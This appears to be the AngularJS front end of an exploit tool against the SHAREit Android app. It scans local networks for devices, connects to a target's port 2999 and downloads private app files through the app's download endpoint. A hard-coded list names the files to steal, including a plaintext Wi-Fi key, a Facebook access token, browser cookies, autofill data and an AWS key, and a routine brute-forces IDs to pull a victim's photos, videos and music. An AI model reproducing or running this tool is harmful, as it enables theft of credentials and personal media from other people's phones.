
//Initializing App
app = angular.module('dumpit',['ngRoute']);

//App Routing
app.config(function($routeProvider) {
    temp_path = '/static';
    $routeProvider
    .when("/home", {
        templateUrl : temp_path + "/home.html"
    })
    .when("/discover", {
        templateUrl : temp_path + "/discover.html"
    })
    .when("/attack", {
        templateUrl : temp_path + "/start_attack.html"
    })
    .when("/attack/:ip", {
        templateUrl : temp_path + "/attack.html"
    })
    .when("/attack/:ip/gallery", {
        templateUrl : temp_path + "/attack_gallery.html"
    })
    .when("/attack/:ip/contacts", {
        templateUrl : temp_path + "/attack_contacts.html"
    })
    .otherwise({
        redirectTo: '/home'
    });
});

//Discover SHAREit networks controller
app.controller('discover',function($scope,$http,$interval){
    $scope.devices = []
    $scope.connectionLost = false;
    $scope.discover_networks = function(){
        $http.get('/retrieve_networks?rand='+Math.random()).then(function(response){
            $scope.connectionLost = false;
            $scope.devices = response.data.data;
        }).catch(function(error){
            $scope.connectionLost = true;
        });
    }

    $scope.discover_networks();
    seach_timer = $interval(function(){
        $scope.discover_networks();
    },5000);
    
    //register this listener inside your controller where the interval belongs.
    $scope.$on('$destroy', function(){
        $interval.cancel(seach_timer)
    });
});

//Selecting target controller
app.controller('start_attack',function($scope,$http,$interval,$window,$location){
    $scope.subnet = {'ip':'192.168.43.1'};
    $scope.ip_regex = /^(?:\d{1,3}\.){3}\d{1,3}$/
    $scope.devices = [];
    $scope.scan_started = false;
    $scope.scan_finished = false;
    $scope.attack_started = false;
    $scope.response_error = false;
    
    $scope.scan_subnet = function(){
        $scope.scan_started = true;
        $scope.scan_finished = false;
        $scope.devices = [];
        $http.get('/scan_subnet?ip='+$window.encodeURIComponent($scope.subnet.ip)).then(function(response){
            $scope.devices = response.data.data;
            $scope.scan_finished = true;
        }).catch(function(error){
            $scope.response_error = true;
        });
        
    };
    
    $scope.start_attack = function(ip=false){
        if (ip !== false && $scope.ip_regex.test(ip)){
            $scope.subnet.ip = ip;
        }
        //Hide this modal then go to attack page
        $('#subnet_modal').modal('hide'); 
        $location.path('/attack/'+$scope.subnet.ip); 
    };
    
    
});


//Exploit against specific target controller
app.controller('attack',function($scope, $http, $routeParams, $window, $interval, $timeout, urlencodeFilter){
    $scope.juicy_files = {
        //stats, apps count, photos count...etc.
        'stats':{'type':'xml', 'path':'/data/data/com.lenovo.anyshare.gps/shared_prefs/feed.xml','comments':'stats, apps count, photos count...etc.'},
        //ssid history, contains the default hotspot settings including plaintext WIFI key
        'ssid_history':{'type':'xml', 'path':'/data/data/com.lenovo.anyshare.gps/shared_prefs/SsidHistory.xml','comments':'ssid history, contains the default hotspot settings including plaintext WIFI key'},
        //Contains user's name and access token when linked with Facebook
        'fb_token':{'type':'xml', 'path':'/data/data/com.lenovo.anyshare.gps/shared_prefs/com.facebook.AccessTokenManager.SharedPreferences.xml','comments':'Contains user\'s name and access token when linked with Facebook'},
        //Contains cookies of websites visited using shareit webview
        'webview_cookies':{'type':'sqlite', 'path':'/data/data/com.lenovo.anyshare.gps/app_webview/Cookies','comments':'Contains cookies of websites visited using shareit webview'},
        //Contains autofill data of websites visited using shareit webview
        'webview_data':{'type':'sqlite', 'path':'/data/data/com.lenovo.anyshare.gps//app_webview/Web Data','comments':'Contains autofill data of websites visited using shareit webview'},
        //Contains list of all video and music files on device with metadata info
        'mediastore':{'type':'sqlite', 'path':'/data/data/com.lenovo.anyshare.gps/databases/media_store.db','comments':'Contains list of all video and music files on device with metadata info'},
        //History of all files transferred using shareit
        'history':{'type':'sqlite', 'path':'/data/data/com.lenovo.anyshare.gps/databases/history.db','comments':'History of all files transferred using shareit'},
        //Application Settings
        'settings':{'type':'xml', 'path':'/data/data/com.lenovo.anyshare.gps/shared_prefs/Settings.xml','comments':'Application Settings'},
        //Amazon Web Service user key
        'aws_auth':{'type':'xml', 'path':'/data/data/com.lenovo.anyshare.gps/shared_prefs/com.amazonaws.android.auth.xml','comments':'Amazon Web Service user key'},
        //ShareZone newsfeed
        'sharezone':{'type':'sqlite', 'path':'/data/data/com.lenovo.anyshare.gps/databases/share_zone.db','comments':'ShareZone newsfeed'},
        //Beyla DB, contains logs and device info
        'beyla_db':{'type':'sqlite', 'path':'/data/data/com.lenovo.anyshare.gps/databases/beyla.db','comments':'Beyla DB, contains logs and device info'},
        }
    
    
    $scope.target = {'ip':$routeParams.ip,'port':2999};
    $scope.source = {'ip':'192.168.1.165'};
    $scope.file = {'type':'file','id':'','format':'raw'}
    $scope.file_types = ['file','photo','video','music','app','game','contact','zip','ebook','doc'];
    $scope.no_id_types = ['file','app','game'];
    $scope.file_formats = ['raw','thumbnail'];
    $scope.ip_regex = /^(?:\d{1,3}\.){3}\d{1,3}$/;
    
    $scope.is_authorized = false;
    $scope.auto_connect = true;
    $scope.connecting = false;
    $scope.notify_victim = true;
    
    $scope.connect_error = {'status':false,'msg':''};
    
    $scope.check_authorization = function(){
        if (!$scope.connecting){
            $http.get('/check_authorization?ip='+urlencodeFilter($scope.target.ip)).then(function(response){
                if(response.data.status == 'success'){
                    $scope.is_authorized = (response.data.data === true);
                    $scope.connect_error.status = false;
                    $scope.connect_error.msg = '';
                }else{
                    $scope.connect_error.status = true;
                    $scope.connect_error.msg = response.data.msg;
                }
            }).catch(function exception_handler(error){
                $scope.connect_error.status = true;
                $scope.connect_error.msg = 'Error occurred communicating to backend server, Is everything is running properly?';
            });
        }
    };
    
    $scope.connect = function(){
        $scope.connecting = true;
        if (!$scope.is_authorized){
            $http.get('/connect?src_ip='+urlencodeFilter($scope.source.ip)+'&target_ip='+urlencodeFilter($scope.target.ip)).then(function(response){
                $scope.connecting = false;
                if(response.data.status == 'success'){
                    $scope.is_authorized = (response.data.data === true);
                    $scope.connect_error.status = false;
                    $scope.connect_error.msg = '';
                }else{
                    $scope.connect_error.status = true;
                    $scope.connect_error.msg = response.data.msg;
                }
            },function error(response){
                $scope.connecting = false;
            }).catch(function(error){
                console.log(error);
                $scope.connecting = false;
            });
        }else{
            $scope.connecting = false;
        }
    };
    
    $scope.check_authorization();
    authorization_timer = $interval(function(){
       $scope.check_authorization(); 
    },5000);
    
    $timeout(function(){
        $scope.connect();
        connect_timer = $interval(function(){
            if ($scope.auto_connect){
                $scope.connect(); 
            }
        },10000);
    },2000);
    
    $scope.download_url = function(){
        url  = 'http://'+ $scope.target.ip + ':' + $scope.target.port + '/download?';
        url += 'metadatatype=' + urlencodeFilter($scope.file.type);
        url += '&metadataid=' + urlencodeFilter($scope.file.id);
        url += '&filetype=' + urlencodeFilter($scope.file.format);
        $window.open(url,'_blank');    
    };
    
    $scope.download_juicy = function(id){
        if($scope.juicy_files.hasOwnProperty(id)){
            $scope.file.type = 'file';
            $scope.file.format = 'raw';
            $scope.file.id = $scope.juicy_files[id].path;
            $scope.download_url();
        }else{
            $window.alert('Unknown file requested');
        }
        
    };
    
    //register this listener inside your controller where the interval belongs.
    $scope.$on('$destroy', function(){
        $interval.cancel(authorization_timer);
        $interval.cancel(connect_timer);
    });
    
});

//Attack Gallery Controller
app.controller('attack_gallery',function($scope,$http,$routeParams,$window,urlencodeFilter,$interval,$timeout){
    $scope.max_retries = 3;
    $scope.target = {'ip':$routeParams.ip,'port':2999};
    $scope.gallery = {'albums':['photo','video','music'],'assets_with_thumbs':['photo','video'],'retrieving_media':false};
    $scope.gallery.current_album = $scope.gallery.albums[0];
    $scope.ip_regex = /^(?:\d{1,3}\.){3}\d{1,3}$/;
    $scope.connect_error = {'status':false,'msg':''};
    
    //Initailize Thumbs Array
    $scope.thumbs = {};
    $scope.gallery.albums.forEach(function(album){
           $scope.thumbs[album] = [];
    });
    
    //Initalize Bruteforce params
    $scope.init_bruteforce = function(){
        $scope.bruteforce = {};
        $scope.bruteforce.stopped = true;
        $scope.gallery.albums.forEach(function(album){
           $scope.bruteforce[album] = {'from':1, 'to':2000, 'step':20, 'retries':0}
        });
    }
    if(localStorage.getItem('bruteforce_data') !== null){
        try{
            $scope.bruteforce = angular.fromJson(localStorage.getItem('bruteforce_data'));
        }catch(e){
            $scope.init_bruteforce();
        }
    }else{
        $scope.init_bruteforce();
    }
    
    
    
    $scope.update_gallery = function(){
        $http.get('/show_thumbs?album='+urlencodeFilter($scope.gallery.current_album)+'&ip='+urlencodeFilter($scope.target.ip))
        .then(function(response){
           if (response.data.status == 'success' && response.data.data.length > 0){
                $scope.thumbs[$scope.gallery.current_album] = response.data.data;
           } 
        }).catch(function(error){ 
        });
    }
    
    $scope.check_mediadb = function(){
        if(!$scope.gallery.retrieving_media){
            $scope.gallery.retrieving_media = true;
            $http.get('/get_media_files?album='+urlencodeFilter($scope.gallery.current_album)+'&ip='+urlencodeFilter($scope.target.ip))
            .then(function(response){
               $scope.gallery.retrieving_media = false;
            }, function error(resposne){
               $scope.gallery.retrieving_media = false;
            }).catch(function(error){ 
               $scope.gallery.retrieving_media = false;
            });
        }
    }
    
    $scope.start_bruteforce = function(){
        if (!$scope.bruteforce.stopped) {
            $http.get('/brute_files?album='+urlencodeFilter($scope.gallery.current_album)+'&ip='+urlencodeFilter($scope.target.ip)+'&from='+urlencodeFilter($scope.bruteforce[$scope.gallery.current_album].from)+'&to='+urlencodeFilter($scope.bruteforce[$scope.gallery.current_album].to)+'&step='+urlencodeFilter($scope.bruteforce[$scope.gallery.current_album].step))
            .then(function successCallback(response){
               if (response.data.status == 'success'){
                    $scope.connect_error.status = false;
                    $scope.connect_error.msg = '';
                    $scope.increment_bruteforce();
               }else{
                    $scope.connect_error.status = true;
                    $scope.connect_error.msg = response.data.msg;
                    $scope.bruteforce[$scope.gallery.current_album].retries++;
               }
               if ($scope.bruteforce[$scope.gallery.current_album].retries >= $scope.max_retries){
                    $scope.increment_bruteforce();
               }
               $timeout(function(){
                    $scope.start_bruteforce();
               },200);
            },function errorCallback(response) {
                //Request Errors
                $scope.bruteforce[$scope.gallery.current_album].retries++;
                $scope.connect_error.status = true;
                $scope.connect_error.msg = 'Hmmmm, we encountered error retreiving response? Sure everything is well-set and target is reachable?';
                if ($scope.bruteforce[$scope.gallery.current_album].retries >= $scope.max_retries){
                    $scope.increment_bruteforce();
               }
                $scope.start_bruteforce();
            }).catch(function(error){
                //Unhandled Exceptions
                console.log(error);
                $scope.bruteforce[$scope.gallery.current_album].retries++;
                $scope.connect_error.status = true;
                $scope.connect_error.msg = 'Hmmmm, we encountered error retreiving response? Sure everything is well-set and target is reachable?';
                if ($scope.bruteforce[$scope.gallery.current_album].retries >= $scope.max_retries){
                    $scope.increment_bruteforce();
                }
                $scope.start_bruteforce();
            });
        }
    }
    
    $scope.increment_bruteforce = function(){
        $scope.bruteforce[$scope.gallery.current_album].retries = 0; //Reset retries counter
        oldfrom = $scope.bruteforce[$scope.gallery.current_album].from;
        $scope.bruteforce[$scope.gallery.current_album].from = $scope.bruteforce[$scope.gallery.current_album].to + 1;
        $scope.bruteforce[$scope.gallery.current_album].to = 2 * $scope.bruteforce[$scope.gallery.current_album].to - oldfrom;
    }
    
    $scope.pause_bruteforce = function(){
        $scope.bruteforce.stopped = true;
    }
    
    
    $scope.restart_bruteforce = function(){
        $scope.bruteforce.stopped = false;
        $scope.start_bruteforce();
        
    }
    

    $scope.change_album = function(album){
        if ($scope.gallery.albums.indexOf(album) >= 0){
            $scope.gallery.current_album = album;
            $scope.check_mediadb();
            $scope.pause_bruteforce();
        }
    }
    
    $scope.change_album($scope.gallery.albums[0]);
    $scope.update_gallery();
    gallery_timer = $interval(function(){
        $scope.update_gallery();
    },5000);
    
    $scope.$on('$destroy', function(){
        $interval.cancel(gallery_timer);
        $scope.pause_bruteforce();
        localStorage.setItem('bruteforce_data',angular.toJson($scope.bruteforce));
    });    
});



//Filters
app.filter('urlencode', function() {
    return window.encodeURIComponent;
});